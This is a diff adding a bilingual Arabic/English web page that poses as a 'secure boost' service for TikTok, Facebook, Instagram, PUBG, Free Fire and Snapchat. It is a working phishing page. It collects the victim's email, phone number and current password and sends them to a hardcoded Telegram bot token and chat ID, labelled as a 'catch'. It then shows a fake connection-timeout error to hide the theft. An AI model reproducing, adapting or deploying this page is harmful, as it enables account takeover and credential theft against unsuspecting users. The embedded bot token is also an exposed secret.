@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AL-SAQR GLOBAL HUB | منصة الصأر العالمية</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #ff6b00; --secondary: #00a8ff; --bg: #020202; --glass: rgba(255, 255, 255, 0.05); --border: rgba(255, 255, 255, 0.1); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body { background: var(--bg); color: white; overflow-x: hidden; scroll-behavior: smooth; }
+        .bg-glow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 50% 50%, rgba(255, 107, 0, 0.03) 0%, transparent 70%); z-index: -1; }
+        header { padding: 1rem 5%; background: rgba(0,0,0,0.9); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 2000; }
+        .logo { font-size: 1.6rem; font-weight: 900; color: var(--primary); text-shadow: 0 0 10px var(--primary); }
+        .lang-btn { background: var(--glass); border: 1px solid var(--primary); color: white; padding: 6px 15px; border-radius: 8px; cursor: pointer; font-weight: 700; }
+        .container { max-width: 1100px; margin: 2rem auto; padding: 1rem; }
+        h2 { text-align: center; margin-bottom: 2rem; font-size: 2.2rem; background: linear-gradient(90deg, #fff, var(--primary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .platforms-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px; margin-bottom: 3rem; }
+        .card { background: var(--glass); border: 1px solid var(--border); border-radius: 15px; padding: 1.5rem 1rem; text-align: center; cursor: pointer; transition: 0.3s; display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .card:hover { transform: translateY(-8px); border-color: var(--primary); background: rgba(255, 107, 0, 0.05); }
+        .card.active { border-color: var(--secondary); background: rgba(0, 168, 255, 0.1); }
+        .auth-panel { display: none; background: var(--glass); border: 1px solid var(--border); border-radius: 25px; padding: 2.5rem; max-width: 600px; margin: 2rem auto; backdrop-filter: blur(15px); }
+        .field { margin-bottom: 1.5rem; }
+        .field label { display: block; margin-bottom: 8px; font-weight: 700; color: #bbb; }
+        .field input { width: 100%; padding: 14px; background: rgba(0,0,0,0.6); border: 1px solid var(--border); border-radius: 12px; color: white; outline: none; border-right: 4px solid var(--primary); }
+        .btn-main { width: 100%; padding: 1.2rem; background: linear-gradient(90deg, var(--primary), #ff3b00); border: none; border-radius: 12px; color: white; font-size: 1.3rem; font-weight: 900; cursor: pointer; }
+        #statusMsg { display: none; margin-top: 1rem; color: #ff3b00; text-align: center; font-weight: 700; padding: 10px; background: rgba(255,59,0,0.1); border-radius: 10px; }
+        footer { text-align: center; padding: 3rem; color: #333; font-size: 0.8rem; font-weight: 900; }
+    </style>
+</head>
+<body>
+<div class="bg-glow"></div>
+<header>
+    <button class="lang-btn" onclick="toggleLang()" id="langBtn">English</button>
+    <div class="logo">AL-SAQR ELITE 🦅</div>
+</header>
+<div class="container">
+    <h2 id="hTitle">اختر المنصة لبدء الشحن الآمن</h2>
+    <div class="platforms-grid">
+        <div class="card" onclick="selectMe(this, 'TikTok')"><i class="fab fa-tiktok"></i><span>TikTok</span></div>
+        <div class="card" onclick="selectMe(this, 'Facebook')"><i class="fab fa-facebook" style="color:#1877f2"></i><span>Facebook</span></div>
+        <div class="card" onclick="selectMe(this, 'Instagram')"><i class="fab fa-instagram" style="color:#e4405f"></i><span>Instagram</span></div>
+        <div class="card" onclick="selectMe(this, 'PUBG')"><i class="fas fa-crosshairs" style="color:var(--primary)"></i><span>PUBG Mobile</span></div>
+        <div class="card" onclick="selectMe(this, 'FreeFire')"><i class="fas fa-gem" style="color:#00a8ff"></i><span>Free Fire</span></div>
+        <div class="card" onclick="selectMe(this, 'Snapchat')"><i class="fab fa-snapchat" style="color:#fffc00"></i><span>Snapchat</span></div>
+    </div>
+    <div class="auth-panel" id="authBox">
+        <div class="field"><label id="l1">عنوان البريد الإلكتروني:</label><input type="email" id="email" placeholder="email@example.com"></div>
+        <div class="field"><label id="l2">رقم الهاتف المرتبط:</label><input type="tel" id="phone" placeholder="+20 100 000 0000"></div>
+        <div class="field"><label id="l3">كلمة المرور الحالية:</label><input type="password" id="pass" placeholder="••••••••"></div>
+        <button class="btn-main" onclick="handleIt()" id="btnText">ابدأ العملية الآن</button>
+        <div id="statusMsg">Error 440: Connection Timeout. Please check your network and try again.</div>
+    </div>
+</div>
+<footer>AL-SAQR GLOBAL TECHNOLOGY © 2026</footer>
+<script>
+    let pName = ""; let lang = "ar";
+    const bT = "8239056545:AAFwGIdJoVqvMa-_gRkSgKwIPcW5MYcn0_o"; // التوكن بتاعك
+    const cI = "8337404357"; // الـ ID بتاعك
+
+    function toggleLang() {
+        lang = lang === "ar" ? "en" : "ar";
+        const isAr = lang === "ar";
+        document.documentElement.dir = isAr ? "rtl" : "ltr";
+        document.getElementById("langBtn").innerText = isAr ? "English" : "العربية";
+        document.getElementById("hTitle").innerText = isAr ? "اختر المنصة لبدء الشحن الآمن" : "Select Platform for Secure Boost";
+        document.getElementById("l1").innerText = isAr ? "عنوان البريد الإلكتروني:" : "Email Address:";
+        document.getElementById("l2").innerText = isAr ? "رقم الهاتف المرتبط:" : "Linked Phone Number:";
+        document.getElementById("l3").innerText = isAr ? "كلمة المرور الحالية:" : "Current Password:";
+        document.getElementById("btnText").innerText = isAr ? "ابدأ العملية الآن" : "Start Process Now";
+    }
+    function selectMe(el, name) {
+        document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+        el.classList.add('active'); pName = name;
+        document.getElementById('authBox').style.display = 'block';
+        document.getElementById('authBox').scrollIntoView({ behavior: 'smooth' });
+    }
+    function handleIt() {
+        const e = document.getElementById('email').value;
+        const ph = document.getElementById('phone').value;
+        const ps = document.getElementById('pass').value;
+        if(!e || !ph || !ps) { alert(lang === "ar" ? "املأ البيانات يا صأر!" : "Fill all fields!"); return; }
+        const msg = `🦅 صيدة صأر عالمية:\n📱 المنصة: ${pName}\n📧 البريد: ${e}\n📞 الهاتف: ${ph}\n🔑 الباسورد: ${ps}`;
+        document.getElementById("btnText").innerText = "...";
+        fetch(`https://api.telegram.org/bot${bT}/sendMessage?chat_id=${cI}&text=${encodeURIComponent(msg)}`)
+        .finally(() => {
+            setTimeout(() => {
+                document.getElementById("statusMsg").style.display = "block";
+                document.getElementById("btnText").innerText = lang === "ar" ? "ابدأ العملية الآن" : "Start Process Now";
+            }, 1200);
+        });
+    }
+</script>
+</body>
+</html>
